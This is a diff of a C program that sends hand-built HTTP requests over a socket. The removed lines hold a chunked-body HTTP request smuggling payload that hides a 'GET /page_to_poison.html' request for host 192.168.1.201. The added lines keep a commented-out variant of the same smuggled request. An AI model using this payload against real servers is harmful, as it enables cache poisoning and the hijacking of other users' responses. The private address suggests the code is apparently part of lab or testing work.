@@ -12,14 +12,11 @@ int main() {
     struct sockaddr_in server_addr;
     char request[1024];
     char buffer[4096];
-    char* body =         "\r\n"
-        "33\r\n"
-        "GET /page_to_poison.html HTTP/1.1\r\n" // Smuggled request
-        "19\r\n"
-        "Host: 192.168.1.201\r\n"
-        "22\r\n"
-        "Connection: Keep-Alive\r\n"
-        "\r\n";
+    char* body =         "\r\n";
+        // "0\r\n\r\n"
+        // "GET /page_to_poison.html HTTP/1.1\r\n"
+        // "Host: 192.168.1.201\r\n"
+        // "Something: ";
     printf("body length is : %ld\n", strlen(body));
     
     // Create socket
